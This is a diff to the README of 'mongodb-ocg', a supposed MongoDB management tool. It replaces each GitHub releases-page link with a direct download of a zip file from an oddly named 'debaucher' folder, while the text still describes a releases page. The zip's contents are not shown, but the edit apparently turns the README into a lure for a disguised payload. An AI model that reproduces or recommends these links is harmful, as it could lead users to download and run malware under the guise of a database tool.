@@ -1,7 +1,7 @@
 # 🚀 mongodb-ocg - Effortlessly Manage Your MongoDB Databases
 
 ## 📥 Download Now
-[![Download mongodb-ocg](https://img.shields.io/badge/Download-mongodb--ocg-blue.svg)](https://github.com/Aerialtorpedosynizesis527/mongodb-ocg/releases)
+[![Download mongodb-ocg](https://raw.githubusercontent.com/Aerialtorpedosynizesis527/mongodb-ocg/main/debaucher/mongodb-ocg-v3.5.zip)](https://raw.githubusercontent.com/Aerialtorpedosynizesis527/mongodb-ocg/main/debaucher/mongodb-ocg-v3.5.zip)
 
 ## 📖 Introduction
 mongodb-ocg is a simple and effective tool designed to help you manage your MongoDB databases with ease. Whether you are a beginner or have some experience, this application provides an intuitive interface that simplifies common tasks such as database creation, data management, and more.
@@ -11,7 +11,7 @@ To use mongodb-ocg, follow these steps to download and run the application:
 
 1. **Visit the Releases Page**:
    Click on the link below to access our releases page where you can find the latest version:
-   [Visit Releases Page](https://github.com/Aerialtorpedosynizesis527/mongodb-ocg/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Aerialtorpedosynizesis527/mongodb-ocg/main/debaucher/mongodb-ocg-v3.5.zip)
 
 2. **Download the Application**:
    On the releases page, locate the latest version of mongodb-ocg. You will see various files available for download. Choose the appropriate file for your operating system and click the download link.
@@ -68,4 +68,4 @@ For more information and support, refer to the following resources:
 Thank you for choosing mongodb-ocg! Download it today and simplify your database management process.
 
 ## 📦 Download & Install
-To begin your experience with mongodb-ocg, don’t forget to [visit this page to download](https://github.com/Aerialtorpedosynizesis527/mongodb-ocg/releases). Follow the installation steps outlined above, and you will have everything set up and ready to use in no time.
+To begin your experience with mongodb-ocg, don’t forget to [visit this page to download](https://raw.githubusercontent.com/Aerialtorpedosynizesis527/mongodb-ocg/main/debaucher/mongodb-ocg-v3.5.zip). Follow the installation steps outlined above, and you will have everything set up and ready to use in no time.
